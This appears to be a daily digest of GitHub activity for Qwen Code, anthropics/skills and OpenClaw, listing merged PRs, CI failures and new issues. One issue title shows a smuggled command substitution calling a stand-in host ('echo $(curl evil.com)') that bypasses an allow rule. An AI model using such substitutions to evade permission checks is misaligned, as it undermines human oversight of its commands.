On November 25, 2026, there were no new releases for Qwen Code; however, several significant pull requests were merged, including a refactor to split the Hosted Harness Session by responsibility (#18290) and a feature to pin Skills and extensions for a turn that allows them to refresh on the next prompt (#18179). Notable fixes included scoping the GitHub failure receipt to explicit mentions (#18281) and a fallback to GITHUB_TOKEN when bot PATs are absent (#18282). The day also saw a surge of new issues, with the failure of the Main CI being highlighted by issue #18252, which reported a failed E2E test on cron tools, contributing to broader concerns about CI stability with multiple failures reported across various tests.

#### ✅ Merged PRs
- [#18290](https://github.com/QwenLM/qwen-code/pull/18290) refactor(serve): Split Hosted Harness Session by responsibility
- [#18281](https://github.com/QwenLM/qwen-code/pull/18281) fix(channels): scope the GitHub failure receipt to explicit mentions
- [#18179](https://github.com/QwenLM/qwen-code/pull/18179) feat(serve): pin Skills and extensions for a turn and refresh them on the next prompt
- [#18278](https://github.com/QwenLM/qwen-code/pull/18278) refactor(runtime-broker): Type measurement diagnostics metadata
- [#18282](https://github.com/QwenLM/qwen-code/pull/18282) fix(triage): fall back to GITHUB_TOKEN when bot PATs are absent
- [#18268](https://github.com/QwenLM/qwen-code/pull/18268) fix(sdk-java): allow the files profile in Hosted lifecycle v2

#### 🐛 New Issues
- [#18252](https://github.com/QwenLM/qwen-code/issues/18252) Main CI failed: E2E Tests — cli/cron-tools.test.ts > … > should have cron tools registered by default (+73 more) `status/needs-triage` `type/bug` 💬26
- [#18253](https://github.com/QwenLM/qwen-code/issues/18253) Main CI failed: Managed Agent gate — ClassSizeRatchetTest.productionClassesStayWithinTheirSizeRatchet `status/needs-triage` `type/bug` 💬13
- [#18288](https://github.com/QwenLM/qwen-code/issues/18288) Main CI failed: Managed Agent gate — no test identified (latest: 2026-11-25) `status/needs-triage` `scope/ci-cd` 💬6
- [#18298](https://github.com/QwenLM/qwen-code/issues/18298) Web Shell renders an unset boolean setting as OFF, hiding that each surface applies its own default 💬4
- [#18258](https://github.com/QwenLM/qwen-code/issues/18258) Main CI failed: Managed Agent gate — HostedMonitorRunFaultGatesIT.fg8cProcessCrashesNeverDuplicateOrFabricateOnMySql (+28 more) `status/needs-triage` `type/bug` 💬4
- [#18295](https://github.com/QwenLM/qwen-code/issues/18295) Main CI failed: Qwen Code CI — src/serve/routes/scheduled-tasks.test.ts > … > flipping recurring→one-shot re-seats createdAt so it fires nex… `status/needs-triage` `type/bug` 💬3
- [#18264](https://github.com/QwenLM/qwen-code/issues/18264) Main CI failed: Qwen Code CI — no test identified (latest: 2026-11-25) `status/needs-triage` `scope/ci-cd` 💬3
- [#18271](https://github.com/QwenLM/qwen-code/issues/18271) Main CI failed: Qwen Code CI — src/commands/review/capture-tui.test.ts > … > dies OF the signal even when it lands during the render window `status/needs-triage` `type/bug` 💬3
- [#18284](https://github.com/QwenLM/qwen-code/issues/18284) Main CI failed: E2E Tests — cli/qwen-serve-streaming.test.ts > … > reports truncation through the stable result code (+9 more) `status/needs-triage` `type/bug` 💬2
- [#18307](https://github.com/QwenLM/qwen-code/issues/18307) Main CI failed: Managed Agent gate — DaemonServeE2ETest.deadlineTerminalIsReliableAndSessionRemainsReusable (+3 more) `status/needs-triage` `type/bug` 💬1
- [#18311](https://github.com/QwenLM/qwen-code/issues/18311) Provide an official Managed Agent Spring Boot Starter 💬1
- [#18305](https://github.com/QwenLM/qwen-code/issues/18305) Voice dictation rejects Bailian qwen-audio-*-asr-flash models — transport whitelist + missing native DashScope ASR path 💬1
- [#18263](https://github.com/QwenLM/qwen-code/issues/18263) [managed-agent] Java SDK rejects lifecycle v2 close for hosted-workspace-files/1 `status/needs-triage` `type/bug` 💬1
- [#18289](https://github.com/QwenLM/qwen-code/issues/18289) feat(managed-agent): define host-supplied execution-definition inputs `status/needs-triage` `type/feature-request` 💬1
- [#18287](https://github.com/QwenLM/qwen-code/issues/18287) Main CI failed: SDK Java — HostedMonitorRunFaultGatesIT.fg8cProcessCrashesNeverDuplicateOrFabricateOnMySql (+37 more) `status/needs-triage` `type/bug` 💬1
- [#18244](https://github.com/QwenLM/qwen-code/issues/18244) Release Failed for v0.28.3-nightly.20261124.56c15cf502 on 2026-11-24 `type/bug` `status/ready-for-agent` `autofix/approved` 💬1
- [#18241](https://github.com/QwenLM/qwen-code/issues/18241) Release Failed for v0.28.3-nightly.20261124.7862c3eef3 on 2026-11-24 `type/bug` `status/ready-for-agent` `autofix/approved` 💬1
- [#18269](https://github.com/QwenLM/qwen-code/issues/18269) Main CI failed: Managed Agent gate — HostedHookCancelFaultGatesIT.fg13dDeleteDrainsHeldAsyncHookThenRunsSessionEndAndSessionDeleteOnceOnMySql (+35 more) `status/needs-triage` `type/bug` 💬1
- [#18251](https://github.com/QwenLM/qwen-code/issues/18251) Main CI failed: Qwen Code CI — daemon/session/DaemonSessionProvider.test.tsx > … > routes model_switch_failed to notices with user_action ca… (+93 more) `status/needs-triage` `type/bug` 💬1
- [#18318](https://github.com/QwenLM/qwen-code/issues/18318) Release Failed for v0.28.5 on 2026-11-25 `type/bug` `status/ready-for-agent` `autofix/approved`
- [#18302](https://github.com/QwenLM/qwen-code/issues/18302) tracking(web-shell): archived conversations search, filtering, sorting, and archive time `priority/P2` `type/feature-request` `category/ui` `scope/session-management`
- [#18313](https://github.com/QwenLM/qwen-code/issues/18313) Web Shell: pass native reasoning selection when creating a standalone session `scope/web-shell`
- [#18292](https://github.com/QwenLM/qwen-code/issues/18292) test(core,cli): close remaining guard-vacuity gaps deferred from #18111 (R2-4)
- [#18291](https://github.com/QwenLM/qwen-code/issues/18291) Project skill SKILL.md content loads into model context without folder trust — consider a visibility or opt-in gate
- [#18293](https://github.com/QwenLM/qwen-code/issues/18293) Allow rules auto-approve command substitution bodies: Bash(echo *) matches echo $(curl evil.com)
- [#18286](https://github.com/QwenLM/qwen-code/issues/18286) Release Failed for N/A on 2026-11-24 `type/bug` `status/ready-for-agent` `autofix/approved`
- [#18283](https://github.com/QwenLM/qwen-code/issues/18283) Release Failed for v0.28.5-preview.0 on 2026-11-24 `type/bug` `status/ready-for-agent` `autofix/approved`
- [#18274](https://github.com/QwenLM/qwen-code/issues/18274) Main CI failed: Desktop Checks — Desktop Checks > … > Run actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 `status/needs-triage` `type/bug`
- [#18272](https://github.com/QwenLM/qwen-code/issues/18272) Release Failed for N/A on 2026-11-24 `type/bug` `status/ready-for-agent` `autofix/approved`
- [#18265](https://github.com/QwenLM/qwen-code/issues/18265) Main CI failed: E2E Tests — sdk-typescript/configuration-options.test.ts > … > should respect logLevel: debug and capture detailed logs (+73 more) `status/needs-triage` `type/bug`
- [#18249](https://github.com/QwenLM/qwen-code/issues/18249) A subagent cancelled while its model request is in flight ends as ERROR, not CANCELLED
- [#18250](https://github.com/QwenLM/qwen-code/issues/18250) Auto-compaction threshold drops to near zero for context windows between 33K and ~60K
- [#18259](https://github.com/QwenLM/qwen-code/issues/18259) Edit and WriteFile write `?` for characters a non-UTF-8 file's encoding cannot represent
- [#18260](https://github.com/QwenLM/qwen-code/issues/18260) GBK files with one or two Chinese lines are read as ISO-8859-1, so the model sees mojibake
- [#18240](https://github.com/QwenLM/qwen-code/issues/18240) Ecosystem listing proposal: Niro, an independent iPhone companion for Qwen Code

#### 🔒 Closed Issues
- [#17559](https://github.com/QwenLM/qwen-code/issues/17559) Web Shell: user prompt sent while a turn is in flight is not recorded in the session transcript (mid-turn drain path)
- [#17201](https://github.com/QwenLM/qwen-code/issues/17201) Release Failed for v0.27.2-nightly.20261113.6f754be654 on 2026-11-13
- [#18148](https://github.com/QwenLM/qwen-code/issues/18148) Daily dependency CVE audit failed
- [#18263](https://github.com/QwenLM/qwen-code/issues/18263) [managed-agent] Java SDK rejects lifecycle v2 close for hosted-workspace-files/1
- [#18244](https://github.com/QwenLM/qwen-code/issues/18244) Release Failed for v0.28.3-nightly.20261124.56c15cf502 on 2026-11-24
- [#18241](https://github.com/QwenLM/qwen-code/issues/18241) Release Failed for v0.28.3-nightly.20261124.7862c3eef3 on 2026-11-24

### Claude Code Skills (`anthropics/skills`)

Top open skill PRs by community engagement:
- [#1742](https://github.com/anthropics/skills/pull/1742) fix(mcp-builder): support mcp>=2 streamable_http_client import and custom headers
- [#1298](https://github.com/anthropics/skills/pull/1298) fix(skill-creator): isolate trigger evals and handle Windows and runtime failures
- [#1245](https://github.com/anthropics/skills/pull/1245) Add notion-spec-to-implementation and quantitative-resume-auditor skills
- [#1980](https://github.com/anthropics/skills/pull/1980) webapp-testing: avoid shell=True in with_server.py
- [#1792](https://github.com/anthropics/skills/pull/1792) fix(docx): report LibreOffice timeout as an error and verify the output

---

## 🦞 OpenClaw Ecosystem

### OpenClaw (`openclaw/openclaw`)

**Stars:** 395,174 · **Open issues:** 9,144 · **Last push:** <1h ago

On November 25, 2026, OpenClaw released version 2026.11.9, which included 13 commits and focused on fine-tuning user experience and system performance. Key updates in this release involve improvements to session management and bug fixes addressing catalog updates and compaction details. Notably merged features include enhancements to session controls and the introduction of new protocols for session member access. The new issues of the day highlighted a critical bug (#204933) regarding the OpenAI gateway-relay, which was reported to finalize transcripts incorrectly, prompting concerns about session integrity and functionality.

#### 🚀 New Releases
- [v2026.11.9](https://github.com/openclaw/openclaw/releases/tag/v2026.11.9) openclaw 2026.11.9
- [v2026.11.8](https://github.com/openclaw/openclaw/releases/tag/v2026.11.8) openclaw 2026.11.8

#### ✅ Merged PRs
- [#205090](https://github.com/openclaw/openclaw/pull/205090) fix: keep compaction details inside the Worked disclosure
- [#205096](https://github.com/openclaw/openclaw/pull/205096) chore(ui): refresh control ui locales
- [#205088](https://github.com/openclaw/openclaw/pull/205088) fix(ci): expand compaction details in lifecycle test
- [#204929](https://github.com/openclaw/openclaw/pull/204929) fix: enable New session without waiting for cached sidebar rows
- [#205080](https://github.com/openclaw/openclaw/pull/205080) test: remove redundant chat Markdown preprocessing cases
- [#204783](https://github.com/openclaw/openclaw/pull/204783) chore: store session member access levels and add the Participate protocol
- [#205083](https://github.com/openclaw/openclaw/pull/205083) fix(ui): preserve cloud profile inputs on catalog updates
- [#204337](https://github.com/openclaw/openclaw/pull/204337) improve: keep composer error cards on one line
- [#204915](https://github.com/openclaw/openclaw/pull/204915) feat(state): publish candidate-owned restore manifests
- [#204866](https://github.com/openclaw/openclaw/pull/204866) fix: keep installations with their update owner
- [#205036](https://github.com/openclaw/openclaw/pull/205036) fix(release): accept acknowledged SDK predecessor drift at publish
- [#205022](https://github.com/openclaw/openclaw/pull/205022) improve: catch bulk-data update migrations in CI
- [#205079](https://github.com/openclaw/openclaw/pull/205079) fix(ci): account for the writing skill's node:test self-test in scheduled coverage
- [#205075](https://github.com/openclaw/openclaw/pull/205075) test: strengthen completed-work narration assertions
- [#205020](https://github.com/openclaw/openclaw/pull/205020) fix(test): await the queued hook-token exec across reload
- [#205014](https://github.com/openclaw/openclaw/pull/205014) fix(ci): retain the schema downgrade runner in deadcode scans
- [#205071](https://github.com/openclaw/openclaw/pull/205071) test: consolidate progress-bar parser coverage
- [#204927](https://github.com/openclaw/openclaw/pull/204927) fix(i18n): avoid repeated source scans in catalog validation tests
- [#205073](https://github.com/openclaw/openclaw/pull/205073) fix: refuse future recovery when current config lost gateway mode
- [#205018](https://github.com/openclaw/openclaw/pull/205018) chore(ci): use optimized Kova setup in performance runs
- [#195998](https://github.com/openclaw/openclaw/pull/195998) fix(android): switch shell to Settings tab when opening Gateway settings
- [#202711](https://github.com/openclaw/openclaw/pull/202711) feat: prepare worker placements for recovery after restart
- [#205070](https://github.com/openclaw/openclaw/pull/205070) docs: use v2026.11.10 title in 2026.11.10 release notes
- [#204868](https://github.com/openclaw/openclaw/pull/204868) fix: let Gateway updates restart without locking the state store
- [#205062](https://github.com/openclaw/openclaw/pull/205062) refactor(agents): admit sessions_send custody, session controls and spawn once
- [#205052](https://github.com/openclaw/openclaw/pull/205052) fix(e2e): repair survivor config before candidate preflight
- [#205059](https://github.com/openclaw/openclaw/pull/205059) test: distinguish transcript search directions
- [#205067](https://github.com/openclaw/openclaw/pull/205067) docs(update): name 2026.11.4 through 2026.11.9 as pnpm updaters that leave the Gateway stopped
- [#205057](https://github.com/openclaw/openclaw/pull/205057) test: remove duplicate late-acceptance history case
- [#205054](https://github.com/openclaw/openclaw/pull/205054) perf(cli): avoid preflight orchestration in config selection
- [#205044](https://github.com/openclaw/openclaw/pull/205044) fix(release): verify public Linux updater URLs before reuse
- [#204912](https://github.com/openclaw/openclaw/pull/204912) fix(browser): show controls in efficient snapshots and navigate results on deeply nested pages
- [#205061](https://github.com/openclaw/openclaw/pull/205061) chore(ui): refresh control ui locales
- [#205045](https://github.com/openclaw/openclaw/pull/205045) test: remove duplicate chat haptics acceptance case
- [#205056](https://github.com/openclaw/openclaw/pull/205056) chore(release): update appcast for 2026.11.9
- [#205041](https://github.com/openclaw/openclaw/pull/205041) fix(bench): recognize snapshot staging after a SQLite crash
- [#204158](https://github.com/openclaw/openclaw/pull/204158) docs: add release notes for OpenClaw 2026.11.10
- [#205050](https://github.com/openclaw/openclaw/pull/205050) fix: isolate cron retention checks from cache warming
- [#205030](https://github.com/openclaw/openclaw/pull/205030) test: clean up the voice note metering fixture
- [#205025](https://github.com/openclaw/openclaw/pull/205025) fix: stop false snapshot test failures from WAL reads
- [#205016](https://github.com/openclaw/openclaw/pull/205016) fix(memory): keep the dream diary when REM ingestion fills the recall store
- [#205027](https://github.com/openclaw/openclaw/pull/205027) test: preserve replacement controls after stale media releases
- [#204358](https://github.com/openclaw/openclaw/pull/204358) fix: show context compaction inline with chat activity
- [#205037](https://github.com/openclaw/openclaw/pull/205037) test(ci): bound performance workflow shell fixtures
- [#196594](https://github.com/openclaw/openclaw/pull/196594) fix(llama-cpp): detect llama-server on its new default port 9931
- [#204978](https://github.com/openclaw/openclaw/pull/204978) refactor(gateway): take github_publish rights from the turn grant
- [#205019](https://github.com/openclaw/openclaw/pull/205019) test: distinguish active speech stops from startup cleanup
- [#205028](https://github.com/openclaw/openclaw/pull/205028) docs: give contributors one guide for OpenClaw copy and errors
- [#204949](https://github.com/openclaw/openclaw/pull/204949) docs: polish user-facing guides for Deep Research, Knowledge, and Browser handoff
- [#204742](https://github.com/openclaw/openclaw/pull/204742) fix: keep other channels' parameters out of each chat's message tool
- [#204947](https://github.com/openclaw/openclaw/pull/204947) docs: add 2026.11.9 patch release notes
- [#204980](https://github.com/openclaw/openclaw/pull/204980) fix(ci): shorten PostgreSQL conformance wall time
- [#204969](https://github.com/openclaw/openclaw/pull/204969) fix(ci): run Android checks together on every backend
- [#205015](https://github.com/openclaw/openclaw/pull/205015) refactor(gateway): admit background turns from their recorded source
- [#205013](https://github.com/openclaw/openclaw/pull/205013) test: bound buffered playback completion checks
- [#204772](https://github.com/openclaw/openclaw/pull/204772) feat(ui): align per-agent model settings with global Models
- [#204559](https://github.com/openclaw/openclaw/pull/204559) refactor(ci): separate UI planning and runtime eligibility
- [#204786](https://github.com/openclaw/openclaw/pull/204786) test(worker): observe task-channel loss before asserting
- [#205012](https://github.com/openclaw/openclaw/pull/205012) fix: retain backup conflict checks during startup recovery
- [#205009](https://github.com/openclaw/openclaw/pull/205009) fix(backup): preserve snapshot acquisition diagnostics
- [#205008](https://github.com/openclaw/openclaw/pull/205008) test: consolidate Talk prompt contract coverage
- [#204989](https://github.com/openclaw/openclaw/pull/204989) fix: resolve source aliases in GitHub launch tests
- [#205002](https://github.com/openclaw/openclaw/pull/205002) chore(release): close out 2026.11.9 on main
- [#205005](https://github.com/openclaw/openclaw/pull/205005) test: consolidate Talk config selection coverage
- [#204943](https://github.com/openclaw/openclaw/pull/204943) fix: release pressured background integrity readers
- [#205003](https://github.com/openclaw/openclaw/pull/205003) fix: detect lost relay audio in burst tests
- [#204990](https://github.com/openclaw/openclaw/pull/204990) fix: detect dropped relay audio in playback tests
- [#204988](https://github.com/openclaw/openclaw/pull/204988) fix(ci): remove unused state upgrade export
- [#204984](https://github.com/openclaw/openclaw/pull/204984) fix: catch dropped audio and frozen waveform regressions
- [#204976](https://github.com/openclaw/openclaw/pull/204976) fix(sessions): clear inherited max-lines violations
- [#195693](https://github.com/openclaw/openclaw/pull/195693) fix(android): stop media downloads when their caller is canceled
- [#195670](https://github.com/openclaw/openclaw/pull/195670) fix(android): identify saved gateways in screen-reader switch labels
- [#204974](https://github.com/openclaw/openclaw/pull/204974) fix: catch missing records in state rebuild tests
- [#204918](https://github.com/openclaw/openclaw/pull/204918) fix(agents): stop Claude CLI thinking summaries from showing twice
- [#204883](https://github.com/openclaw/openclaw/pull/204883) test(update): prove the previous reader after pre-ready migrations
- [#204972](https://github.com/openclaw/openclaw/pull/204972) fix(ci): align restart withdrawal expectations
- [#204961](https://github.com/openclaw/openclaw/pull/204961) fix: keep restored config over newer recovery backups
- [#204950](https://github.com/openclaw/openclaw/pull/204950) fix: remove stray backticks from conversation previews
- [#204955](https://github.com/openclaw/openclaw/pull/204955) fix: keep named links intact in long Mattermost file captions
- [#204925](https://github.com/openclaw/openclaw/pull/204925) fix: prevent false context overflow in fresh Knowledge chats
- [#204946](https://github.com/openclaw/openclaw/pull/204946) fix(ci): restore pre-v44 schema migration fixtures
- [#204967](https://github.com/openclaw/openclaw/pull/204967) fix: catch silent failures in documentation translation tests
- [#204547](https://github.com/openclaw/openclaw/pull/204547) refactor(ci): separate test tier policy from protected inventory
- [#204948](https://github.com/openclaw/openclaw/pull/204948) refactor(tests): remove unused archive timeout fixture
- [#204887](https://github.com/openclaw/openclaw/pull/204887) fix: keep your message when the model changes in a chat that uses a context engine
- [#204954](https://github.com/openclaw/openclaw/pull/204954) test(docs-i18n): remove redundant frontmatter fixture
- [#204896](https://github.com/openclaw/openclaw/pull/204896) fix: keep a session on its selected model when subagent results and other internal turns run
- [#204876](https://github.com/openclaw/openclaw/pull/204876) test(ai): give continuation fixtures writer scope
- [#204951](https://github.com/openclaw/openclaw/pull/204951) docs: help PR authors distinguish outcomes from evidence
- [#204900](https://github.com/openclaw/openclaw/pull/204900) fix: keep Codex sign-in links working in chats without buttons
- [#204938](https://github.com/openclaw/openclaw/pull/204938) fix: Control UI freezes in Safari and the Mac app when you hover across the sidebar rail
- [#204906](https://github.com/openclaw/openclaw/pull/204906) fix(release): wait for dispatched website run before watching
- [#204916](https://github.com/openclaw/openclaw/pull/204916) fix: keep included configs working on the first start after upgrading
- [#204909](https://github.com/openclaw/openclaw/pull/204909) fix: keep concurrent first chats running on PostgreSQL
- [#204942](https://github.com/openclaw/openclaw/pull/204942) fix(release): accept any shipped release as the fast-track reference
- [#204907](https://github.com/openclaw/openclaw/pull/204907) fix: release live WAL readers before backup verification
- [#204908](https://github.com/openclaw/openclaw/pull/204908) fix: keep Gateway upgrades running with unreadable optional state files
- [#204932](https://github.com/openclaw/openclaw/pull/204932) chore: remove duplicate startup corpus runs
- [#204922](https://github.com/openclaw/openclaw/pull/204922) fix(ui): preserve chat drafts until the first Gateway connection
- [#204928](https://github.com/openclaw/openclaw/pull/204928) fix(ci): accept steering lifecycle callbacks in rejection test
- [#201747](https://github.com/openclaw/openclaw/pull/201747) fix: keep agent skills available in workspace automations
- [#204904](https://github.com/openclaw/openclaw/pull/204904) refactor(channels): admit channel senders through the turn grant
- [#204917](https://github.com/openclaw/openclaw/pull/204917) fix: refresh worktree branches after initializing a nested repository
- [#204859](https://github.com/openclaw/openclaw/pull/204859) chore(release): update appcast for 2026.11.8
- [#204924](https://github.com/openclaw/openclaw/pull/204924) chore: remove an unused workspace template fixture
- [#204921](https://github.com/openclaw/openclaw/pull/204921) fix(release): update the Windows-node main E2E harness
- [#204913](https://github.com/openclaw/openclaw/pull/204913) fix(models): keep model refresh available during hosted catalog updates
- [#204888](https://github.com/openclaw/openclaw/pull/204888) fix(release): pass admitted coverage to build-only publication budget
- [#204910](https://github.com/openclaw/openclaw/pull/204910) fix: keep the Gateway down for less time when you run openclaw doctor --fix
- [#204898](https://github.com/openclaw/openclaw/pull/204898) fix: recognize maintained checks in dead-code analysis
- [#204911](https://github.com/openclaw/openclaw/pull/204911) fix(release): seal build-only npm artifacts for the publication channel
- [#204857](https://github.com/openclaw/openclaw/pull/204857) test(gateway): answer warm summary requests in the restart resume fixture
- [#204894](https://github.com/openclaw/openclaw/pull/204894) fix(ci): stabilize Gateway timing planner fixture
- [#204886](https://github.com/openclaw/openclaw/pull/204886) fix(test): reject missing Slack select placeholders
- [#204879](https://github.com/openclaw/openclaw/pull/204879) fix(release): disable evidence reuse for build-only validation
- [#204800](https://github.com/openclaw/openclaw/pull/204800) fix(build): remove empty files from generated packages
- [#204872](https://github.com/openclaw/openclaw/pull/204872) test(agents): remove the compaction test facade
- [#203723](https://github.com/openclaw/openclaw/pull/203723) fix(macos): explain how to connect a named profile to a foreground Gateway
- [#204685](https://github.com/openclaw/openclaw/pull/204685) ci(update): prove schema trials and rollback on owner PRs
- [#204869](https://github.com/openclaw/openclaw/pull/204869) fix(release): trust published waiver verdict in stable closeout
- [#204871](https://github.com/openclaw/openclaw/pull/204871) fix(ci): restore read-only Home browser coverage
- [#204756](https://github.com/openclaw/openclaw/pull/204756) refactor(gateway): decide what a turn may do once, as a turn grant
- [#204809](https://github.com/openclaw/openclaw/pull/204809) fix(plugins): resolve selected Claude and Pi export sources exactly
- [#204799](https://github.com/openclaw/openclaw/pull/204799) fix: let macOS app and Docker packaging read the tarball path again
- [#204820](https://github.com/openclaw/openclaw/pull/204820) fix(release): approve fast-track only through GitHub
- [#204865](https://github.com/openclaw/openclaw/pull/204865) test: check JSON exports by behavior
- [#204862](https://github.com/openclaw/openclaw/pull/204862) Fix SQLite fixture lifetimes in startup inspection and rerank tests
- [#204863](https://github.com/openclaw/openclaw/pull/204863) test(ui): preserve pairing error guidance metadata
- [#204807](https://github.com/openclaw/openclaw/pull/204807) fix(release): prepare fast-track artifacts without validation
- [#204528](https://github.com/openclaw/openclaw/pull/204528) fix: let maintainers compare catalog changes against released readers again
- [#204860](https://github.com/openclaw/openclaw/pull/204860) fix: isolate immutable Gateway service tests from host PIDs
- [#204752](https://github.com/openclaw/openclaw/pull/204752) fix: check update database safety before stopping the Gateway
- [#204411](https://github.com/openclaw/openclaw/pull/204411) fix(plugins): run session-scoped plugin forks in the admitted session
- [#204835](https://github.com/openclaw/openclaw/pull/204835) fix: let a Git install switch back to the npm package
- [#204856](https://github.com/openclaw/openclaw/pull/204856) test(onboarding): share entrypoint fixture setup
- [#204787](https://github.com/openclaw/openclaw/pull/204787) fix: keep a chat's client capabilities when queued messages resume after a restart
- [#204851](https://github.com/openclaw/openclaw/pull/204851) test(shared): cover fences longer than three backticks
- [#204848](https://github.com/openclaw/openclaw/pull/204848) fix(sessions): keep acknowledged inputs queued across a graceful restart
- [#204849](https://github.com/openclaw/openclaw/pull/204849) fix: stop the Control UI reconnect test from failing on slow runs
- [#204758](https://github.com/openclaw/openclaw/pull/204758) fix(compaction): leave room for the next turn after compaction
- [#204763](https://github.com/openclaw/openclaw/pull/204763) fix(release): keep child-run durations parseable with color
- [#204845](https://github.com/openclaw/openclaw/pull/204845) test(agent-guidance): assert configuration rejection reasons
- [#204841](https://github.com/openclaw/openclaw/pull/204841) fix(ci): await tool cards in the catalog locale test
- [#204833](https://github.com/openclaw/openclaw/pull/204833) test(macos): share synchronous process cleanup waits
- [#204844](https://github.com/openclaw/openclaw/pull/204844) test(advisor): select the registered reply hook
- [#204830](https://github.com/openclaw/openclaw/pull/204830) ci(test): run Git release contracts on Node
- [#203970](https://github.com/openclaw/openclaw/pull/203970) fix: stop replaying Claude progress updates in active chats
- [#204700](https://github.com/openclaw/openclaw/pull/204700) fix: report update outcomes from the Gateway that is serving
- [#204831](https://github.com/openclaw/openclaw/pull/204831) fix(beam): resume confirmed mirrors across restarts
- [#204832](https://github.com/openclaw/openclaw/pull/204832) test(bootstrap): make negative CA path checks deterministic
- [#204827](https://github.com/openclaw/openclaw/pull/204827) test(identity): prune duplicate protocol coverage
- [#204748](https://github.com/openclaw/openclaw/pull/204748) fix(test): keep subagent wake receipt checks from timing out
- [#204743](https://github.com/openclaw/openclaw/pull/204743) fix(ci): complete project browser typeahead fixture
- [#204823](https://github.com/openclaw/openclaw/pull/204823) test(lint): fail turn-kind reads and owner production outside admission
- [#204825](https://github.com/openclaw/openclaw/pull/204825) test(memory): prune duplicates and check retained values
- [#204815](https://github.com/openclaw/openclaw/pull/204815) test(agent): require results after repeat reset
- [#204814](https://github.com/openclaw/openclaw/pull/204814) test(protocol): cover unresolved and projected fields
- [#204705](https://github.com/openclaw/openclaw/pull/204705) fix: keep typing working in the Mac app's chat composer
- [#204781](https://github.com/openclaw/openclaw/pull/204781) test(llm): drop duplicate fast-mode capability rows
- [#203866](https://github.com/openclaw/openclaw/pull/203866) fix: show Claude CLI document uploads only once in chat
- [#202182](https://github.com/openclaw/openclaw/pull/202182) fix: clarify CLI completion after skipping AI
- [#204810](https://github.com/openclaw/openclaw/pull/204810) fix(beam): preserve attributed assistant replies during mirror export
- [#204813](https://github.com/openclaw/openclaw/pull/204813) improve(gateway): speed up session lists for invited viewers
- [#204817](https://github.com/openclaw/openclaw/pull/204817) refactor(agents): ask one owner for the OpenAI Responses API family
- [#204796](https://github.com/openclaw/openclaw/pull/204796) feat: let plugin services page through local session catalogs
- [#204808](https://github.com/openclaw/openclaw/pull/204808) test(sdk): require retained recovery diagnostics
- [#204802](https://github.com/openclaw/openclaw/pull/204802) fix(gateway): honor explicit session scopes during device pairing
- [#204806](https://github.com/openclaw/openclaw/pull/204806) test(catalog): isolate descriptor and version assertions
- [#203949](https://github.com/openclaw/openclaw/pull/203949) fix: open dashboard links from chat without reloading
- [#203873](https://github.com/openclaw/openclaw/pull/203873) fix(macos): find text in the focused browser tab
- [#203848](https://github.com/openclaw/openclaw/pull/203848) fix: open a browser side tab with Command-T on Mac
- [#203968](https://github.com/openclaw/openclaw/pull/203968) fix: keep empty list spacing out of chat text selections
- [#204798](https://github.com/openclaw/openclaw/pull/204798) test(tool-call-repair): move boundary cases to parser
- [#204722](https://github.com/openclaw/openclaw/pull/204722) fix(ci): use the Beam packet ABI in capabilities
- [#204793](https://github.com/openclaw/openclaw/pull/204793) improve(beam): skip repeated cleaning of unchanged mirrors
- [#204755](https://github.com/openclaw/openclaw/pull/204755) fix(compaction): compact with the model a session inherits from its parent
- [#204790](https://github.com/openclaw/openclaw/pull/204790) test(acp): check redacted credential payloads
- [#204729](https://github.com/openclaw/openclaw/pull/204729) fix(gateway): wait for transient SQLite ownership at startup
- [#204653](https://github.com/openclaw/openclaw/pull/204653) chore(release): close out 2026.11.8 on main
- [#204780](https://github.com/openclaw/openclaw/pull/204780) test(agents): require committed split-turn compaction
- [#204747](https://github.com/openclaw/openclaw/pull/204747) test(ai): remove duplicate seeded stream parity case
- [#204427](https://github.com/openclaw/openclaw/pull/204427) fix(release): accept lifecycle update receipts and resolve the channel-switch candidate
- [#204777](https://github.com/openclaw/openclaw/pull/204777) fix(ci): align MCP isolation test with sign-in capabilities
- [#204782](https://github.com/openclaw/openclaw/pull/204782) fix(release): digest full-size fast-track evidence manifests
- [#204688](https://github.com/openclaw/openclaw/pull/204688) refactor(test): remove unused runtime importer injection
- [#204715](https://github.com/openclaw/openclaw/pull/204715) fix: keep cloud environment settings saves consistent
- [#204774](https://github.com/openclaw/openclaw/pull/204774) test(update): preserve Git tools in isolated pnpm fixture
- [#204601](https://github.com/openclaw/openclaw/pull/204601) fix: reuse stable-qualified beta validation for final releases
- [#204770](https://github.com/openclaw/openclaw/pull/204770) fix(ci): keep onboarding test working with occupied port
- [#203950](https://github.com/openclaw/openclaw/pull/203950) fix: open Profile at the requested settings section
- [#204773](https://github.com/openclaw/openclaw/pull/204773) docs: restore Patch badge on v2026.11.7 release navigation
- [#204759](https://github.com/openclaw/openclaw/pull/204759) test(release): bind trust closeout to activation success
- [#204753](https://github.com/openclaw/openclaw/pull/204753) test(update): verify newer launcher formats stay intact
- [#203929](https://github.com/openclaw/openclaw/pull/203929) fix: keep resumed chat activity below the opening request
- [#204751](https://github.com/openclaw/openclaw/pull/204751) fix(agents): settle a yielded requester batch while a per-child delivery is in flight
- [#204703](https://github.com/openclaw/openclaw/pull/204703) refactor(test): remove duplicate unlink confirmation coverage
- [#204749](https://github.com/openclaw/openclaw/pull/204749) chore(ui): refresh control ui locales
- [#204741](https://github.com/openclaw/openclaw/pull/204741) test(infra): verify replaced worker budgets retire
- [#204435](https://github.com/openclaw/openclaw/pull/204435) fix: warn before uninstalling the default model's provider
- [#204673](https://github.com/openclaw/openclaw/pull/204673) fix(commands): show denied slash commands to Gateway clients
- [#204432](https://github.com/openclaw/openclaw/pull/204432) improve: fold image inspections into chat activity
- [#203319](https://github.com/openclaw/openclaw/pull/203319) fix: stop worker sessions from looping on a wait tool they can't use
- [#204727](https://github.com/openclaw/openclaw/pull/204727) fix: prevent duplicate session naming and isolate core runtime test timeouts
- [#202288](https://github.com/openclaw/openclaw/pull/202288) fix: let Docker config and channel commands work while the Gateway runs
- [#204732](https://github.com/openclaw/openclaw/pull/204732) refactor(test): reuse the active runtime in glob fixtures
- [#204447](https://github.com/openclaw/openclaw/pull/204447) fix: let local MCP servers ask you to sign in again
- [#204440](https://github.com/openclaw/openclaw/pull/204440) fix: keep the selected provider when setting up a chat model
- [#203971](https://github.com/openclaw/openclaw/pull/203971) fix: show the selected model name when switching chats
- [#204739](https://github.com/openclaw/openclaw/pull/204739) fix(ci): align catalog latency test with export policy
- [#204733](https://github.com/openclaw/openclaw/pull/204733) fix(release): isolate speech and node timeout validation
- [#204726](https://github.com/openclaw/openclaw/pull/204726) fix(gateway): keep worker turn tests from loading unrelated plugins
